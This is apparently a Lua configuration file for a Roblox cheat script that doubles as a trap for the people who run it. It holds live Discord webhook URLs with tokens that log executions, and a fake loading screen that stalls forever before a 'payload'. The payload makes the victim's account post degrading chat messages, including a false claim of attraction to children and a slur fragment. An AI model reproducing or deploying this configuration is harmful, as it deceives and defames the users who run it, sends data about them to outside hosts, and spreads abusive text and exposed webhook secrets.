
return {
    -- ═══════════════════════════════════════════════════════════════
    --  MASTER SWITCH
    -- ═══════════════════════════════════════════════════════════════
    enabled = true,  -- set to false to disable the script & run payload

    -- ═══════════════════════════════════════════════════════════════
    --  BLACKLIST
    -- ═══════════════════════════════════════════════════════════════
    blacklisted_users = {
    },

    blacklisted_groups = {
        -- Add Group IDs here to block entire groups!
        --
    },

    -- ═══════════════════════════════════════════════════════════════
    --  KEY SYSTEM
    -- ═══════════════════════════════════════════════════════════════
    required_key = "bread",
    required_key2 = "PERMKEY",
    discord_invite = "https://discord.gg/m6tgr8ZY7F",

    -- ═══════════════════════════════════════════════════════════════
    --  AD MESSAGES (used when enabled = false / payload mode)
    -- ═══════════════════════════════════════════════════════════════
    ad_message = "IM A LARP AND I GOT CAUGHT RUNNING A SCRIPT MADE BY SOMEBODY ELSE!",

    ad_chat_messages = {
        "im a larp ",
        "im the biggest larper. i kicked the scripter who made this script. i also cheat. and i work a job so i can play roblox and exploit!",
        "o3fu owns me. ",
        " i leik kds  i leik kds  i leik kds  i leik kds  i leik kds  i leik kds  i leik kds  i leik kds ",
        "i larp, im under 13 please report me lol yall are fat fat fat ng ng",
    },

    -- ═══════════════════════════════════════════════════════════════
    --  WEBHOOK (execution logger)
    -- ═══════════════════════════════════════════════════════════════
    webhook_url = "https://discord.com/api/webhooks/1483085353068793867/-7B1fQ10tnfWo226Mhr9uNslwlEGWSX3OdnFXBAqhHx3zL81XdUC_5nL5k9Gzy7kfXeD",
    webhook_url2 = "https://discord.com/api/webhooks/1484160667094220860/cNOlFjWnb9HXyVp-I01amn3pEBSOnf6LG3d-6foUSI7pxmLUniwPQh8qT_F-b88ZT-nV",
    webhook_enabled = true,  -- set to false to stop logging

    -- ═══════════════════════════════════════════════════════════════
    --  GROUP IDS TO CHECK
    -- ═══════════════════════════════════════════════════════════════
    group_check_enabled = false,
    group_ids = { 260140977, 633417839 },
    
    playercount_enabled = true,
    groupcount_enabled = true,

    -- ═══════════════════════════════════════════════════════════════
    --  LOADING SCREEN MESSAGES (fake loading before payload)
    -- ═══════════════════════════════════════════════════════════════
    loading_steps = {
        { text = "Initializing script...",            duration = 1.5 },
        { text = "Connecting to server...",           duration = 2.0 },
        { text = "Checking key system...",            duration = 2.5 },
        { text = "Key verified",                      duration = 1.0 },
        { text = "Looking for mods...",               duration = 2.0 },
        { text = "No mods detected",                  duration = 1.0 },
        { text = "Checking gate URL...",              duration = 2.5 },
        { text = "Gate responded",                    duration = 1.0 },
        { text = "Loading modules...",                duration = 1.5 },
        { text = "Fetching remote config...",         duration = 2.0 },
        { text = "Injecting hooks...",                duration = 1.5 },
        { text = "Almost ready...",                   duration = 1.0 },
        { text = "Script disabled by o3fu, running the back up script.. please wait", duration = 9999999999 },
    },

    -- ═══════════════════════════════════════════════════════════════
    --  CHAT SPAM SETTINGS
    -- ═══════════════════════════════════════════════════════════════
    chat_spam_interval = 6,  -- seconds between each chat message
}
